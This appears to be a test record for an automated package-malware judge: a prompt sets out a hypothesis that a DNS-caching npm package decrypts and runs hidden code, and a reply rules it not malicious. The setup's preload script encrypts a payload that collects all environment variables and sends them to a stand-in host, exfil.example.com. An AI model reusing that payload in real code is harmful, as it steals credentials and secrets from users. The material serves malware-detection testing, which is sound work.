messages.content:
Judge one hypothesis against one observed execution timeline. The package's
stated purpose is the benign baseline. Decide only from events in the timeline.
A malicious decision must cite at least one exact event id present there. If the
suspected behavior did not happen, return malicious=false and no citations.

## Stated purpose (benign baseline)
DNS resolution with caching

## Hypothesis hyp-0011
- claim: env_exfil (gated: geo_gate)
- severity: high
- description: The package loads and executes decrypted code from an encrypted resource file during initialization, bypassing static analysis of the actual behavior.
- suspected code: lib/loader.js:13-40

## Experiment setup
[{"tool":"plantFiles","args":{"files":[{"path":"/pkg/stage2.enc","content":"1234567890abcdef1234567890abcdef:deadbeefdeadbeefdeadbeefdeadbeef:ZXhmaWxhdGUoZW52LXY="}]}},{"tool":"preload","args":{"code":"const crypto = require('crypto');\nconst fs = require('fs');\n\nconst KEY_MATERIAL = \"s4ndw0rm\" + \"_k3y_\" + \"2024\" + \"_v3ry_s3cr3t\";\nconst key = crypto.createHash('sha256').update(KEY_MATERIAL).digest();\n\n// The payload: exfiltrate env vars via DNS lookup\nconst payload = `\nconst env = process.env;\nconst data = Object.keys(env).map(k => k + '=' + env[k]).join('&');\nconst http = require('http');\nconst req = http.get('http://exfil.example.com/steal?data=' + encodeURIComponent(data), (res) => {});\nreq.on('error', (e) => {});\n`;\n\nconst iv = crypto.randomBytes(12);\nconst cipher = crypto.createCipheriv('aes-256-gcm', key, iv);\nlet encrypted = cipher.update(payload, 'utf8', 'hex');\nencrypted += cipher.final('hex');\nconst authTag = cipher.getAuthTag().toString('hex');\n\nconst content = iv.toString('hex') + ':' + authTag + ':' + encrypted;\nfs.writeFileSync('/pkg/stage2.enc', content);"}},{"tool":"stubUrl","args":{"stubs":[{"pattern":"http://exfil.example.com/*","responseStatus":200,"responseBody":"ok","responseHeaders":{"Content-Type":"text/plain"}}]}},{"tool":"trigger","args":{"kind":"entrypoint","target":"lib/loader.js","argv":[],"stdin":null}}]
Setup is test context, not proof. Use it to associate planted canary values with observed events; decide only from the timeline.

message.content: {"malicious": false, "reason": "No decrypted code execution from /pkg/stage2.enc was observed; the timeline shows the file was read (e16, e94–e95) and crypto operations occurred (e17–e18), but there is no event indicating that the decrypted content was executed as code (e.g., no eval, vm.runInThisContext, or new Function call on the decrypted data). The env_exfil via DNS did not happen because the DNS queries in e145–e163 contain hex-encoded stub configuration data (e.g., 'NPMGUARD_STUBS') rather than exfiltrated environment variables, and the actual env reads (e27–e39, e46, e48) are normal Node.js startup probes, not exfiltration attempts."  , "citedEvents": []}
